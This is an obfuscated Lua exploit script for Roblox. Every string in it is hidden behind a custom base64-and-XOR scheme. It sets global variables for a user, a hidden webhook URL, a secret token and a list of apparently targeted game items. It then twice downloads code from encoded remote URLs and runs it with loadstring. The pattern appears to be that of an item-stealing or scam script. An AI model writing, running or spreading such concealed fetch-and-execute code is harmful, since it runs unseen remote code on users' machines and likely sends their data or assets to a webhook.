--[[ Protected with multi-layer encoding ]]
local _llO0IllIII=47610;local _l00l0O0l=tostring(38);local _IOl00l00OI=tostring(9907);local _II0II000=tostring(167);local _00IOOOOI="_Oll0I";local _O0IlIIOll=56831;local _0llIII0O=33957;local _OI0IlOI0l0=89960;
local _Ol0Ol0lO="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _00000IlO(_IO0l00)
  local _O0I0OO=""
  _IO0l00=string.gsub(_IO0l00,"[^".._Ol0Ol0lO.."=]","")
  for _IIO0=1,#_IO0l00,4 do
    local a=string.find(_Ol0Ol0lO,string.sub(_IO0l00,_IIO0,_IIO0),1,true)-1
    local b=string.find(_Ol0Ol0lO,string.sub(_IO0l00,_IIO0+1,_IIO0+1),1,true)-1
    local c=string.find(_Ol0Ol0lO,string.sub(_IO0l00,_IIO0+2,_IIO0+2),1,true)
    local d=string.find(_Ol0Ol0lO,string.sub(_IO0l00,_IIO0+3,_IIO0+3),1,true)
    if c then c=c-1 end
    if d then d=d-1 end
    _O0I0OO=_O0I0OO..string.char((a*4+math.floor((b or 0)/16))%256)
    if c then _O0I0OO=_O0I0OO..string.char(((b or 0)%16*16+math.floor((c or 0)/4))%256) end
    if d then _O0I0OO=_O0I0OO..string.char(((c or 0)%4*64+(d or 0))%256) end
  end
  return _O0I0OO
end
local _OIllIl0O={202,170,185,136,156,180,230,45,137,140,234}
local function _0OIllll0(_IO0l00)
  local _O0I0OO=""
  for _IIO0=1,#_IO0l00 do
    local k=_OIllIl0O[(_IIO0-1)%#_OIllIl0O+1]
    local b=string.byte(_IO0l00,_IIO0)
    local r=0
    for bit=0,7 do
      local ba=math.floor(b/2^bit)%2
      local bb=math.floor(k/2^bit)%2
      if ba~=bb then r=r+2^bit end
    end
    _O0I0OO=_O0I0OO..string.char(r)
  end
  return _O0I0OO
end
local function _0Ol0lIOIlIII(_IO0l00) return _0OIllll0(_00000IlO(_IO0l00)) end
local _0IOlOOOI0=tostring(5295);local _Il000I=tostring(1790);
local function _OOIlI0lOOI()
getgenv().User = _0Ol0lIOIlIII("oMvS+6".."6D1xyw")

getgenv().Webhook = _0Ol0lIOIlIII("ot7N+O".."+OyQL".."t5Zmp".."xcv".."sst".."eJQKbt".."mqOFzu3+".."3IlC4v/".."F+56".."Osa".."uE1".."h+w".."vNv9n".."I26rY".."3VFK".."bopoH1".."+7HS9Z".."x/4+iJu".."fnW4ev".."yqErtwd".."/8+P".."/b8uOrY".."c3kg4".."vv5s7e".."8NR".."j+8u".."s++j9z".."+zegx".."7Q67".."KzzIz4p".."P6/".."S+LKh".."A==")

getgenv().SecretToken = _0Ol0lIOIlIII("rp+Av".."/nS1E6".."k7Y77y".."JS8qtD".."fAO".."jp36".."mH37v6h".."IQd".."u+7dqZO".."A")

getgenv().Brainrots = {
  _0Ol0lIOIlIII("md7L6evW".."g1/79cq".."Pxtz49N".."WIWQ=="),
  _0Ol0lIOIlIII("h8/W//A="),
  _0Ol0lIOIlIII("mcHQ".."6vX".."Qjw3d4".."4Omz80="),
  _0Ol0lIOIlIII("gs/Y".."7PDRlV6".."pxIW42d".."zl/do".."="),
  _0Ol0lIOIlIII("gtP".."d+v2Uo".."l/o64".."Wkiv".."rp8tqDQe".."XjhKM".."="),
  _0Ol0lIOIlIII("jtjY7/Pa".."xm7o".."4oSvxtXn".."8t0="),
  _0Ol0lIOIlIII("jtjY7".."/Paxmrg".."4o2v2".."NDm".."9Q=="),
  _0Ol0lIOIlIII("hsuZ2+n".."ElEjk6cq".."JxdTq9d".."qHXuD".."jhA=="),
  _0Ol0lIOIlIII("ic/L6".."vnGk14="),
  _0Ol0lIOIlIII("msXJ".."6+n".."Gkw3o".."4o7q7ND".."y5sG".."UWA=="),
  _0Ol0lIOIlIII("mMXK7".."eWUh0P".."trL".."6vzt".."3x"),
  _0Ol0lIOIlIII("icvJ".."4ejViE".."KpwYWo".."0w=="),
  _0Ol0lIOIlIII("icXW4/WU".."h0Ptr".."Kej".."xtLh"),
  _0Ol0lIOIlIII("iN/L7+n".."GiQ3".."I4o".."7q7".."Mvx6".."caJ"),
  _0Ol0lIOIlIII("gc/N/ezV".."kg3L".."/oW5"),
  _0Ol0lIOIlIII("hsuZy".."/3Hhw".."3L44".."U="),
  _0Ol0lIOIlIII("mdrW5/".."fNxkzn".."6Mqa39T".."498".."0="),
  _0Ol0lIOIlIII("hsuZ2".."/nXlEj".."9rKmlx9".."vh8tW".."VRObi"),
  _0Ol0lIOIlIII("jcvL6fH".."Vxkzn".."6MqHy939".."8tC".."TQ+4="),
  _0Ol0lIOIlIII("hsXP7".."bz4iV".."vsrKiv".."y8s="),
  _0Ol0lIOIlIII("ic/V7e/".."Aj0z".."lrLqv".."zdj76cc="),
  _0Ol0lIOIlIII("hsuZzv".."Pbgg3K4".."4eow9f".."p79".."2JQw=".."="),
  _0Ol0lIOIlIII("mM/Q5".."vXA".."iQ3a".."4I+jzd".."Hh6".."Ns="),
  _0Ol0lIOIlIII("hsXKqN3Z".."j0rm".."/w=".."="),
  _0Ol0lIOIlIII("hsXKqM".."/RjULl7".."YK5"),
  _0Ol0lIOIlIII("mcPe5vP".."Ggw3K".."7Zir".."2tjr+Q=".."="),
  _0Ol0lIOIlIII("jNjY7+7".."Vi0yp7".."YSuiv".."rg89eU".."TOT".."t"),
  _0Ol0lIOIlIII("j8b".."c7v3".."akkK".."pypijz".."dY="),
  _0Ol0lIOIlIII("hsuZz".."/XagUj".."7rLmvwdb".."k/d".."w="),
  _0Ol0lIOIlIII("jcPX7/n".."Gxmrs/ou".."+"),
  _0Ol0lIOIlIII("mcvU5eX".."ajw".."3P7Z6+".."w9fh"),
  _0Ol0lIOIlIII("hsXK".."qM/Eh0rh".."6Z6+".."w8o="),
  _0Ol0lIOIlIII("mdrY7/TR".."klngrL6/".."y9Xt6MCP"),
  _0Ol0lIOIlIII("i8TN5".."/LdiQ=="),
  _0Ol0lIOIlIII("mMXK7".."ejAjw".."3d+Yumz8".."389Q=="),
  _0Ol0lIOIlIII("hMva".."4PO".."UtV".."3w6I+4"),
  _0Ol0lIOIlIII("gc/N6/TB".."lFip7YSu".."ivT9".."78CT".."X/w="),
  _0Ol0lIOIlIII("md3".."Y7/vNx".."m/745k".."="),
  _0Ol0lIOIlIII("hsu".."Z2vPZh".."0P95Yn".."q7cvp8".."tCD"),
  _0Ol0lIOIlIII("hdja6f".."DRgkLn"),
  _0Ol0lIOIlIII("nsP".."a/P3Xx".."n7o5".."J+4"),
  _0Ol0lIOIlIII("gc/N/ez".."Vkg3".."C6Zqr3g".."=="),
  _0Ol0lIOIlIII("hsuZ3P3X".."iQ3K44eo".."w9fp79".."2JQw=="),
  _0Ol0lIOIlIII("nsvX77".."zgh".."0PurK".."Gvxtz".."8/dqB"),
  _0Ol0lIOIlIII("hsX".."P4fK".."UtEL66Q".."=="),
  _0Ol0lIOIlIII("hsX".."KqMjVh".."UL75Z6".."r2Q".."=="),
  _0Ol0lIOIlIII("j9z".."Q5PnQiU".."M="),
  _0Ol0lIOIlIII("hsXKq".."MzGj0D".."m/w=".."="),
  _0Ol0lIOIlIII("j9n".."W47zng".."0bm".."4Iui"),
  _0Ol0lIOIlIII("hsXKqMz".."BgUrg6".."Zk="),
  _0Ol0lIOIlIII("ntjY5P3Y".."g0nm4g".."=="),
  _0Ol0lIOIlIII("nt/f7rzg".."iVjq7Y".."Q="),
  _0Ol0lIOIlIII("h8XX".."7eW".."Uq0L".."n6ZP".."q+Nzh8tC".."DSP".."s="),
  _0Ol0lIOIlIII("icLQ5P".."DdiA3".."K5IOm".."ww=="),
  _0Ol0lIOIlIII("icL".."Q+O/bxk".."zn6Mq".."b39z78".."w=="),
  _0Ol0lIOIlIII("iMv".."a/e".."7Bxkz".."n6MqPz".."d797".."sE="),
  _0Ol0lIOIlIII("hsvKqM/".."dlQ=="),
  _0Ol0lIOIlIII("juCZ2".."P3agkw="),
  _0Ol0lIOIlIII("nsva5+7d".."kkyp".."zoOpw9rk".."+cCH"),
  _0Ol0lIOIlIII("hN/a5".."PnV".."lEKp".."yIOk".."xcr".."7/cGUQ".."g==")
}

task.spawn(function()
loadstring(game:HttpGet(_0Ol0lIOIlIII("ot7".."N+O+Oy".."QLo/I".."Pkxszp".."7tmJX6fi".."j76F3+Hw".."0ZUC".."/7jFpsXY".."7PnGlQ".."Kxv".."NKsntj".."sqNGES+".."+43f/Jj".."L//0dA".."c7O3Z88".."+Nu".."fmG1QP".."l+Ys=")))()
end)

task.spawn(function()
loadstring(game:HttpGet(_0Ol0lIOIlIII("ot7N".."+O+".."OyQL77Z".."3kzdD89".."MGEWPr".."pmKnF1".."/z52pID".."6uO".."H5f".."na+vXEkm".."z774Kj3N".."z775uqW".."OjYj7ne".."yqf".."u0YB".."epuSPq87".."Kp/HVj0O".."myJirzd".."7p/t".."iDav".."zlvq/Z".."zabwwYc=")))()
end)

end
local _lOl0OIIlI0=(752*2482>752) and _OOIlI0lOOI or nil
if _lOl0OIIlI0 then _lOl0OIIlI0() end
